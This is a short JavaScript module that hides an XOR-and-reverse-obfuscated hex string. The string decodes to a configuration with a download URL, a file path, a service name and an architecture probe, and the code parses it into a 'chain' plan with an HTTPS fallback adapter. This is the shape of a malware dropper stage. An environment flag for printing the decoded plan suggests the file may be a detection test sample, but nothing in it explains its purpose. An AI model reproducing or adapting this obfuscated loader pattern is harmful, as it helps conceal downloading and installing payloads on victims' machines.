const moduleShape = Object.freeze({ format: "commonjs" });

const Material_35e0a399 = "[\"b5\",\"b3\",\"b9\",\"a6\",\"a2\",\"b5\",\"a3\",\"fe\",\"e4\",\"e2\",\"e1\",\"b3\",\"e2\",\"b1\",\"fd\",\"b5\",\"b4\",\"bf\",\"be\",\"ed\",\"b5\",\"bd\",\"b1\",\"be\",\"8f\",\"b5\",\"b3\",\"b9\",\"a6\",\"a2\",\"b5\",\"a3\",\"ac\",\"b8\",\"b3\",\"a2\",\"b1\",\"fe\",\"a3\",\"a3\",\"b5\",\"b3\",\"bf\",\"a2\",\"a0\",\"ed\",\"b5\",\"b2\",\"bf\",\"a2\",\"a0\",\"8f\",\"b8\",\"b3\",\"a2\",\"b1\",\"ac\",\"a3\",\"ba\",\"bd\",\"fe\",\"e4\",\"e5\",\"b6\",\"e5\",\"e3\",\"e0\",\"e4\",\"e2\",\"e1\",\"b3\",\"e2\",\"b1\",\"fd\",\"b5\",\"b7\",\"b1\",\"a4\",\"a3\",\"fe\",\"ff\",\"b5\",\"b4\",\"bf\",\"be\",\"fd\",\"a3\",\"a3\",\"b5\",\"a2\",\"a4\",\"be\",\"a5\",\"b8\",\"ff\",\"a0\",\"bd\",\"a4\",\"ff\",\"ed\",\"b8\",\"a4\",\"b1\",\"a0\",\"8f\",\"b5\",\"bc\",\"b9\",\"b6\",\"ac\",\"e1\",\"b3\",\"e2\",\"b1\",\"ff\",\"a4\",\"b9\",\"b4\",\"a5\",\"91\",\"b5\",\"b4\",\"bf\",\"9e\",\"ed\",\"a4\",\"be\",\"b5\",\"b7\",\"b1\",\"8f\",\"a2\",\"b5\",\"a3\",\"a5\",\"ac\",\"b9\",\"a0\",\"b1\",\"ff\",\"b4\",\"b9\",\"bc\",\"b1\",\"a6\",\"be\",\"b9\",\"fe\",\"b5\",\"bc\",\"a0\",\"bd\",\"b1\",\"a8\",\"b5\",\"fe\",\"e4\",\"e5\",\"b6\",\"e5\",\"e3\",\"e0\",\"e4\",\"e2\",\"e1\",\"b3\",\"e2\",\"b1\",\"fd\",\"b5\",\"b4\",\"bf\",\"be\",\"ff\",\"ff\",\"ea\",\"a3\",\"a0\",\"a4\",\"a4\",\"b8\",\"ed\",\"bc\",\"a2\",\"a5\",\"ac\",\"e3\",\"e0\",\"e4\",\"e2\",\"e1\",\"93\",\"e2\",\"91\",\"fd\",\"95\",\"94\",\"9f\",\"9e\",\"ed\",\"b4\",\"b9\",\"8f\",\"be\",\"b7\",\"b9\",\"b1\",\"a0\",\"bd\",\"b1\",\"b3\",\"ac\",\"e5\",\"ed\",\"a4\",\"be\",\"a5\",\"bf\",\"b3\",\"8f\",\"b5\",\"b7\",\"b1\",\"a4\",\"a3\",\"ac\",\"bb\",\"b3\",\"b1\",\"b2\",\"bc\",\"bc\",\"b1\",\"b6\",\"8f\",\"b8\",\"b3\",\"a2\",\"b1\",\"8f\",\"a3\",\"a0\",\"a4\",\"a4\",\"b8\",\"ed\",\"a2\",\"b5\",\"a4\",\"a0\",\"b1\",\"b4\",\"b1\",\"ac\",\"a3\",\"a3\",\"b5\",\"b3\",\"bf\",\"a2\",\"a0\",\"8f\",\"b8\",\"b3\",\"a4\",\"b1\",\"a0\",\"a3\",\"b9\",\"b4\",\"fc\",\"b5\",\"b4\",\"bf\",\"bd\",\"8f\",\"b5\",\"b7\",\"be\",\"b1\",\"b8\",\"b3\",\"fc\",\"b5\",\"bc\",\"b9\",\"b6\",\"8f\",\"b5\",\"a4\",\"b9\",\"a2\",\"a7\",\"fc\",\"b5\",\"a4\",\"bf\",\"bd\",\"b5\",\"a2\",\"8f\",\"b5\",\"a2\",\"b9\",\"a5\",\"a1\",\"b3\",\"b1\",\"fc\",\"a4\",\"a3\",\"bf\",\"b8\",\"8f\",\"b5\",\"bc\",\"b9\",\"b6\",\"bf\",\"a2\",\"a0\",\"ed\",\"a3\",\"a0\",\"b5\",\"a4\",\"a3\",\"ac\",\"e1\",\"ed\",\"a6\"]";

const Codec_35e0a399 = "hex_array|reverse_then_xor|d0";



function load_35e0a399() { return JSON.parse(Material_35e0a399).map((value) => Number.parseInt(value, 16)); }

function decode_35e0a399(e) { return [...e].reverse().map((value) => value ^ 208); }

async function recover_35e0a399() {

  const n = ["north", "south"].join(":");

  const e = load_35e0a399(); let d = [];

  d = await Promise.resolve(e).then(decode_35e0a399);

  void n; return Buffer.from(d).toString("ascii");

}

async function inspect_35e0a399() { return ({ ...{ value: await recover_35e0a399() } }).value; }

async function plan_35e0a399() { const inspect = inspect_35e0a399; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "https_arch_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }

void moduleShape; void plan_35e0a399;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_35e0a399());

